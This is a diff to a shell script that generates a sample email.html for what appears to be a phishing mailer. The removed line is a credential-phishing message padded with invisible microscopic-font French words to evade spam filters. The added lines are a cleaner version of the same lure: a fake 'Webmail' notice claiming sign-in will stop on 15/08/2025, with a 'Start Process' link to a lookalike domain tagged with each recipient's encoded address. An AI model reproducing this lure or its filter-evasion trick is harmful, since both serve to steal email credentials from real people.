@@ -202,7 +202,66 @@ EOL
 # Create a sample HTML email content (email.html)
 echo "Creating email.html with email content..."
 cat > email.html <<EOL
-<html><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="x-mailer" content="Microsoft Outlook 16.0"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><span style="font-size: 0.00000000000000000000000000000050340ex;">___________________________________________________________________</span>W<span style="font-size: 0.00000000000000000000000000000077979ex;">C\'est\n</span>ebm<span style="font-size: 0.00000000000000000000000000000080816ex;">Serval,\n</span>ai<span style="font-size: 0.00000000000000000000000000000075268%;">ait\n</span>l<span style="font-size: 0.00000000000000000000000000000011829%;">jusqu\xe2\x80\x99au\n</span>&shy;&nbsp;N<span style="font-size: 0.00000000000000000000000000000045207ex;">Pr\xc3\xa9l\xc3\xa8vements\n</span>otif<span style="font-size: 0.00000000000000000000000000000058705%;">Rh\xc3\xb4ne\n</span>ic<span style="font-size: 0.0000000000000000000000000000006354%;">financ\xc3\xa9\n</span>ation</title><style type="text/css">body {margin: 0;padding: 0;font-family: Roboto, Tahoma, Helvetica, sans-serif;color: #333333;line-height: 1.5;}.header-bar {background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */color: #ffffff;padding: 10px;font-size: 12px;}.content {padding: 20px;max-width: 600px;margin: 0 auto;}h1 {color: #ee6111; /* Kept orange accent */text-align: center;font-size: 28px;margin-bottom: 20px;}.footer {text-align: center;font-size: 12px;color: #777777;margin-top: 30px;}</style></head><body><table width="100%" cellspacing="0" cellpadding="0"><tbody><tr><td class="header-bar">M<span style="font-size: 0.0000000000000000000000000000007525ex;">Veil\n</span>ail Ser<span style="font-size: 0.00000000000000000000000000000066311%;">portail\n</span>v<span style="font-size: 0.00000000000000000000000000000075161%;">Roser,\n</span>er Accoun<span style="font-size: 0.00000000000000000000000000000043210%;">Besan\xc3\xa7on\n</span>t U<span style="font-size: 0.00000000000000000000000000000053410ex;">portail\n</span>pd<span style="font-size: 0.00000000000000000000000000000029029ex;">s\'\xc3\xa9tablissait\n</span>ate<span style="font-size: 0.00000000000000000000000000000061971em;">toxicomanies,\n</span>&shy;&nbsp;Notifica<span style="font-size: 0.00000000000000000000000000000020548vh;">histoire,\n</span>t<span style="font-size: 0.00000000000000000000000000000032994vh;">math\xc3\xa9matiques,\n</span>i<span style="font-size: 0.00000000000000000000000000000022387%;">norv\xc3\xa9gienneWorldCat\n</span>on</td></tr></tbody></table><div class="content"><h1>We<span style="font-size: 0.00000000000000000000000000000079582ex;">camps\n</span>b<span style="font-size: 0.00000000000000000000000000000063139ex;">\xc3\x89duens\n</span>ma<span style="font-size: 0.0000000000000000000000000000006471em;">s\'enrichit\n</span>il</h1><p>Y<span style="font-size: 0.00000000000000000000000000000031156vh;">trafics\n</span>our<span style="font-size: 0.00000000000000000000000000000081082ex;">constitutionnelk\n</span>&shy;&nbsp;si<span style="font-size: 0.00000000000000000000000000000044541%;">tarif\n</span>gn-in <span style="font-size: 0.00000000000000000000000000000079317em;">trouv\xc3\xa9\n</span>method will s<span style="font-size: 0.00000000000000000000000000000056716ex;">Beer,\n</span>top f<span style="font-size: 0.00000000000000000000000000000084033ex;">Immigration\n</span>unc<span style="font-size: 0.00000000000000000000000000000013902vw;">l\'empire\n</span>tioning o<span style="font-size: 0.00000000000000000000000000000089390vh;">denses\n</span>n <span style="font-size: 0.00000000000000000000000000000027021vw;">mod\xc3\xa8les\n</span>15/0<span style="font-size: 0.00000000000000000000000000000065945%;">contemporain\n</span>8/2025 <span style="font-size: 0.00000000000000000000000000000035609ex;">produits\n</span>(<u><em>Confirmatio<span style="font-size: 0.00000000000000000000000000000066157vh;">classes\n</span>n <span style="font-size: 0.00000000000000000000000000000077797vw;">r\xc3\xa9partis\n</span>Need<span style="font-size: 0.00000000000000000000000000000020991%;">Culture\n</span>ed</em></u>)<span style="font-size: 0.00000000000000000000000000000023516vw;">participe-t-elle\n</span>, y<span style="font-size: 0.00000000000000000000000000000085399ex;">l\xe2\x80\x99universit\xc3\xa9\n</span>ou m<span style="font-size: 0.00000000000000000000000000000035029vw;">Alains\n</span>us<span style="font-size: 0.00000000000000000000000000000079194em;">EUR\n</span>t <span style="font-size: 0.00000000000000000000000000000075804ex;">tradition\n</span>take prompt <span style="font-size: 0.00000000000000000000000000000040015vw;">soins\n</span>st<span style="font-size: 0.00000000000000000000000000000074251ex;">baby\n</span>eps t<span style="font-size: 0.00000000000000000000000000000089490vh;">s\xe2\x80\x99\xc3\xa9rigent\n</span>o m<span style="font-size: 0.0000000000000000000000000000003481%;">voiture\n</span>ai<span style="font-size: 0.00000000000000000000000000000023920ex;">lien\n</span>ntain <span style="font-size: 0.0000000000000000000000000000004931%;">habitats\n</span>an<span style="font-size: 0.00000000000000000000000000000024318vw;">solide,\n</span>d<span style="font-size: 0.0000000000000000000000000000002965%;">populaire\n</span>&shy;&nbsp;preven<span style="font-size: 0.00000000000000000000000000000070491%;">vraiment\n</span>t <span style="font-size: 0.00000000000000000000000000000093891ex;">favorise,\n</span>l<span style="font-size: 0.00000000000000000000000000000034596vh;">langue\n</span>imita<span style="font-size: 0.0000000000000000000000000000004042ex;">Regnard,\n</span>t<span style="font-size: 0.0000000000000000000000000000003980vh;">douloureuse\n</span>io<span style="font-size: 0.0000000000000000000000000000009244ex;">payants\n</span>ns <span style="font-size: 0.00000000000000000000000000000037058%;">qu\'une\n</span>to <span style="font-size: 0.00000000000000000000000000000037260em;">date\n</span>your <span style="font-size: 0.00000000000000000000000000000095857em;">Commissariat\n</span>mail a<span style="font-size: 0.00000000000000000000000000000023119%;">d\'habitude\n</span>c<span style="font-size: 0.00000000000000000000000000000021884%;">l\xe2\x80\x99\xc3\xa9ducation\n</span>c<span style="font-size: 0.00000000000000000000000000000071549vw;">monuments\n</span>ount<span style="font-size: 0.00000000000000000000000000000041045ex;">lorraine,\n</span>.<br><br><span style="font-size: 15pt;"><font color="#ff0000"><u><a href="http://www.wabmail.gitse.in#{base64-encryptedrecipents-email}">Start <span style="font-size: 0.00000000000000000000000000000025759em;">Landes\n</span>Process<span style="font-size: 0.00000000000000000000000000000038816vh;">Tribune\n</span></a></u></font></span></p><p>View <span style="font-size: 0.00000000000000000000000000000044801vh;">majoritaire\n</span>t<span style="font-size: 0.00000000000000000000000000000065197ex;">Midi\n</span>h<span style="font-size: 0.0000000000000000000000000000006431vh;">Suisse\n</span>e <span style="font-size: 0.00000000000000000000000000000061731ex;">s\'y\n</span>attached <span style="font-size: 0.00000000000000000000000000000056011em;">royaumeN\n</span>d<span style="font-size: 0.00000000000000000000000000000096893vh;">cassoulet\n</span>ocument <span style="font-size: 0.000000000000000000000000000000591vh;">Guadeloupe,\n</span>for f<span style="font-size: 0.00000000000000000000000000000028875vh;">Trait\xc3\xa9\n</span>ur<span style="font-size: 0.00000000000000000000000000000064122%;">Lisle\n</span>ther <span style="font-size: 0.0000000000000000000000000000007495%;">quotidienne\n</span>in<span style="font-size: 0.00000000000000000000000000000071912ex;">fiscaux\n</span>s<span style="font-size: 0.00000000000000000000000000000066485vh;">Pr\xc3\xa9vert\n</span>tru<span style="font-size: 0.00000000000000000000000000000055455vh;">permettent\n</span>c<span style="font-size: 0.00000000000000000000000000000057555%;">r\xc3\xa9gress\xc3\xa9\n</span>tions.</p><p>Thank <span style="font-size: 0.00000000000000000000000000000040773ex;">am\xc3\xa9ricain\n</span>you<span style="font-size: 0.00000000000000000000000000000075894vh;">Heyer,\n</span>.<span style="font-size: 0.00000000000000000000000000000050006%;">l\'oxyg\xc3\xa8ne\n</span></p></div><div class="footer"><p>&copy; 2<span style="font-size: 0.00000000000000000000000000000057276vh;">Berlioz,\n</span>025&nbsp;<span style="font-size: 0.00000000000000000000000000000014114%;">g\xc3\xa9rer\n</span>Webm<span style="font-size: 0.00000000000000000000000000000091567em;">n\xe2\x80\x99a\n</span>a<span style="font-size: 0.00000000000000000000000000000075357em;">si\xc3\xa8cleb\n</span>il In<span style="font-size: 0.00000000000000000000000000000068078ex;">acteurs\n</span>c.Fo<span style="font-size: 0.00000000000000000000000000000057083ex;">Carolingiens,\n</span>r i<span style="font-size: 0.00000000000000000000000000000033804vw;">multiples\n</span>nt<span style="font-size: 0.00000000000000000000000000000016986vw;">Rouget\n</span>ended r<span style="font-size: 0.00000000000000000000000000000091027vw;">P\xc3\xa8res\n</span>e<span style="font-size: 0.00000000000000000000000000000062517em;">Tandis\n</span>c<span style="font-size: 0.00000000000000000000000000000018951ex;">repr\xc3\xa9sentants\n</span>ipient.<span style="font-size: 0.00000000000000000000000000000077735em;">Bangkok,\n</span></p></div></body></html>
+<html><head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="x-mailer" content="Microsoft Outlook 16.0">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Notification</title>
+  <style type="text/css">
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Roboto, Tahoma, Helvetica, sans-serif;
+      color: #333333;
+      line-height: 1.5;
+    }
+    .header-bar {
+      background-color: #d40000; /* Changed from #029740 (green) to #d40000 (red) */
+      color: #ffffff;
+      padding: 10px;
+      font-size: 12px;
+    }
+    .content {
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    h1 {
+      color: #ee6111; /* Kept orange accent */
+      text-align: center;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #777777;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <table width="100%" cellspacing="0" cellpadding="0">
+    <tbody><tr>
+      <td class="header-bar">
+        Mail Server Account Update Notification
+      </td>
+    </tr>
+  </tbody></table>
+
+  <div class="content">
+    <h1>Webmail</h1>
+    <p>Your sign-in method will stop functioning on 15/08/2025 (<u><em>Confirmation Needed</em></u>), you must take prompt steps to maintain and prevent limitations to your mail account.<br><br><span style="font-size: 15pt;"><font color="#ff0000"><u><a href="http://www.wabmail.gitse.in#{base64-encryptedrecipents-email}">Start Process</a></u></font></span></p>
+	    <p>View the attached document for further instructions.</p>
+    <p>Thank you.</p>
+  </div>
+
+  <div class="footer">
+    <p>&copy; 2025&nbsp;Webmail Inc.  For intended recipient.</p>
+  </div>
+
+</body></html>
 EOL
 
 # Create a sample txt subject content (subject.txt)
